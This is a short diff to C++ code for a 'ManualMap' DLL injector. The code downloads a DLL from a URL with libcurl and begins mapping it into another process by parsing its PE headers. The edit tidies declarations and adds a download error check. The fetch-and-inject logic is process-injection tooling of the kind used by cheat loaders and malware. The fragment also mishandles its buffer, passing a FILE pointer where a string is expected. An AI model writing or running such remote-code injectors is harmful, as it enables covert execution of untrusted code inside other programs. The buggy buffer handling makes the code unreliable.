@@ -1,8 +1,4 @@
 #include "injection.h"
-#include <iostream>
-#include <fstream>
-#include <curl/curl.h>
-using namespace std;
 
 size_t curlWriteFunc(char* data, size_t size, size_t nmemb, std::string* buffer)
 {
@@ -18,14 +14,17 @@ size_t curlWriteFunc(char* data, size_t size, size_t nmemb, std::string* buffer)
 
 bool ManualMap(HANDLE hProc, const char* DllURL) {
 	FILE* curlBuffer;
-	CURL* curl;
-	CURLcode res;
-	curl = curl_easy_init();
+	CURL* curl = curl_easy_init();
 	curl_easy_setopt(curl, CURLOPT_URL, DllURL);
 	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &curlBuffer);
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curlWriteFunc);
-	res = curl_easy_perform(curl);
+	CURLcode CURLresult = curl_easy_perform(curl);
 	curl_easy_cleanup(curl);
+	if (CURLresult != CURLE_OK)
+	{
+		printf("[-] Can't get DLL\n");
+		return false;
+	}
 
 	BYTE*					pSrcData		= reinterpret_cast<BYTE*>(curlBuffer);
 	IMAGE_NT_HEADERS*		pOldNtHeared	= nullptr;
